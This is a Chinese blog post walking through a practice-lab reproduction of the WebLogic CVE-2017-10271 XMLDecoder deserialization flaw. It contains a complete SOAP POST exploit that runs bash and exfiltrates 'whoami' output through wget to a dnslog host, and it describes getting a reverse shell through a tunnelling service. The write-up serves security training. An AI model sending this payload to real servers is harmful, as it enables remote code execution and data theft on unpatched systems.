---
layout: post
title: "CVE-2017-10271Weblogic-WLS-Security反序列化漏洞复现"
date: 2025-03-13 20:23:49 +0800
description: "Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。一开始反弹shell没有成功，网上查询资料，根据又菜又爱倒腾大佬文章提示，发现部分字符需要转换成实体编码；网上随便找的实体编码在线转换网站。的内网穿透工具（免费的），顺利反弹到本地的。会跳转到如下页面，说明有漏洞。"
keywords: "[CVE-2017-10271]Weblogic--WLS Security反序列化漏洞复现"
categories: ['未分类']
tags: ['网络安全']
artid: "146240443"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146240443
    alt: "CVE-2017-10271Weblogic-WLS-Security反序列化漏洞复现"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146240443
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146240443
cover: https://bing.ee123.net/img/rand?artid=146240443
image: https://bing.ee123.net/img/rand?artid=146240443
img: https://bing.ee123.net/img/rand?artid=146240443
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     [CVE-2017-10271]Weblogic--WLS Security反序列化漏洞复现
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="markdown_views prism-atom-one-dark" id="content_views">
    <svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
     <path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
     </path>
    </svg>
    <p>
    </p>
    <p>
    </p>
    <h2>
     <a id="_1">
     </a>
     靶机地址
    </h2>
    <p>
     网站地址
     <a href="cyberstrikelab.com" rel="nofollow">
      cyberstrikelab.com
     </a>
     <br/>
     靶机地址
     <a href="https://www.cyberstrikelab.com/#/target/target_detail/219" rel="nofollow">
      CVE-2017-10271
     </a>
    </p>
    <h2>
     <a id="_5">
     </a>
     靶机说明
    </h2>
    <p>
     Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。
    </p>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/7c16233c0c7c4b5ebe0dbdd2f2ae4d9c.png"/>
    </p>
    <h2>
     <a id="_10">
     </a>
     开启并访问靶机
    </h2>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/619b6668363f49e182b17435860b89f3.png"/>
    </p>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/041e1b1f8add4f929839ef648f14c483.png"/>
    </p>
    <h2>
     <a id="POC_14">
     </a>
     POC
    </h2>
    <p>
     在访问地址后面补充
     <code>
      /wls-wsat/CoordinatorPortType
     </code>
     会跳转到如下页面，说明有漏洞
     <br/>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/fe9bfad86cf64528a4bfa073c60242a2.png"/>
    </p>
    <h2>
     <a id="exp_17">
     </a>
     exp
    </h2>
    <p>
     两个核心：
    </p>
    <ul>
     <li>
      默认的
      <code>
       GET
      </code>
      方法修改为
      <code>
       POST
      </code>
      方法
     </li>
     <li>
      Content-Type: text/xml
     </li>
    </ul>
    <p>
     另外，靶机没有
     <code>
      curl
     </code>
     不过有
     <code>
      wget
     </code>
     ，可通过
     <code>
      wget
     </code>
     +
     <code>
      dnslog
     </code>
     信息外带
    </p>
    <pre><code class="prism language-bash">POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: xxxxxx.cyberstrikelab.com:83
Content-Type: text/xml
Content-Length: <span class="token number">617</span>

<span class="token operator">&lt;</span>soapenv:Envelope xmlns:soapenv<span class="token operator">=</span><span class="token string">"http://schemas.xmlsoap.org/soap/envelope/"</span><span class="token operator">&gt;</span> <span class="token operator">&lt;</span>soapenv:Header<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>work:WorkContext xmlns:work<span class="token operator">=</span><span class="token string">"http://bea.com/2004/06/soap/workarea/"</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>java <span class="token assign-left variable">version</span><span class="token operator">=</span><span class="token string">"1.4.0"</span> <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"java.beans.XMLDecoder"</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>void <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"java.lang.ProcessBuilder"</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>array <span class="token assign-left variable">class</span><span class="token operator">=</span><span class="token string">"java.lang.String"</span> <span class="token assign-left variable">length</span><span class="token operator">=</span><span class="token string">"3"</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>void <span class="token assign-left variable">index</span><span class="token operator">=</span><span class="token string">"0"</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>string<span class="token operator">&gt;</span>/bin/bash<span class="token operator">&lt;</span>/string<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/void<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>void <span class="token assign-left variable">index</span><span class="token operator">=</span><span class="token string">"1"</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>string<span class="token operator">&gt;</span>-c<span class="token operator">&lt;</span>/string<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/void<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>void <span class="token assign-left variable">index</span><span class="token operator">=</span><span class="token string">"2"</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>string<span class="token operator">&gt;</span>wget <span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span>.xxxxx.dnslog.cn
<span class="token operator">&lt;</span>/string<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/void<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/array<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>void <span class="token assign-left variable">method</span><span class="token operator">=</span><span class="token string">"start"</span>/<span class="token operator">&gt;</span><span class="token operator">&lt;</span>/void<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/java<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/work:WorkContext<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/soapenv:Header<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>soapenv:Body/<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/soapenv:Envelope<span class="token operator">&gt;</span>
</code></pre>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/ee021404c942409ea9e31b01e4f83698.png"/>
    </p>
    <h2>
     <a id="shell_57">
     </a>
     反弹shell
    </h2>
    <p>
     一开始反弹shell没有成功，网上查询资料，根据又菜又爱倒腾大佬文章提示，发现部分字符需要转换成实体编码；网上随便找的实体编码在线转换网站
     <a href="https://www.convertstring.com/zh_CN/EncodeDecode/HtmlEncode" rel="nofollow">
      HtmlEncode
     </a>
     ，反弹过程中使用了
     <a href="https://www.cpolar.com/" rel="nofollow">
      cpolar
     </a>
     的内网穿透工具（免费的），顺利反弹到本地的
     <code>
      kali
     </code>
     电脑，顺利
     <code>
      getshell
     </code>
     。
    </p>
    <p>
     <img alt="利用在线网站将反弹 shell 的部分字符进行实体编码" src="https://i-blog.csdnimg.cn/direct/04874d8ba41d4402af0847deaed83619.png"/>
    </p>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/72f9c638ce2e46b2bae355e68bd194e8.png"/>
    </p>
    <h2>
     <a id="flag_66">
     </a>
     后续查找flag过程略
    </h2>
    <p>
     <br/>
     <br/>
     <br/>
     <br/>
     <br/>
     <br/>
    </p>
    <p>
     参考资料以及工具网站：
    </p>
    <ol>
     <li>
      cyberstrikelab靶机网站
      <a href="https://www.cyberstrikelab.com/" rel="nofollow">
       https://www.cyberstrikelab.com/
      </a>
     </li>
     <li>
      <a href="https://blog.csdn.net/q943111495?type=blog">
       又菜又爱倒腾
      </a>
      大佬的
      <a href="https://blog.csdn.net/q943111495/article/details/121032361">
       《Weblogic XMLDecoder反序列化漏洞复现(CVE-2017-10271)》
      </a>
     </li>
     <li>
      反弹shell网站
      <a href="https://www.revshells.com/" rel="nofollow">
       https://www.revshells.com/
      </a>
     </li>
     <li>
      实体编码在线转换网站
      <a href="https://www.convertstring.com/zh_CN/EncodeDecode/HtmlEncode" rel="nofollow">
       https://www.convertstring.com/zh_CN/EncodeDecode/HtmlEncode
      </a>
     </li>
     <li>
      内网穿透工具
      <a href="https://www.cpolar.com/" rel="nofollow">
       https://www.cpolar.com/
      </a>
     </li>
     <li>
      大表哥哟的 cpolar 使用教程
      <a href="https://mp.weixin.qq.com/s/-yD7ymzdlegwcLugnL9FZw" rel="nofollow">
       https://mp.weixin.qq.com/s/-yD7ymzdlegwcLugnL9FZw
      </a>
     </li>
    </ol>
   </div>
   <link href="../../assets/css/markdown_views-a5d25dd831.css" rel="stylesheet"/>
   <link href="../../assets/css/style-e504d6a974.css" rel="stylesheet"/>
  </div>
 </article>
 <p alt="6874747073:3a2f2f626c6f672e6373646e2e6e65742f67727272725f312f:61727469636c652f64657461696c732f313436323430343433" class_="artid" style="display:none">
 </p>
</div>


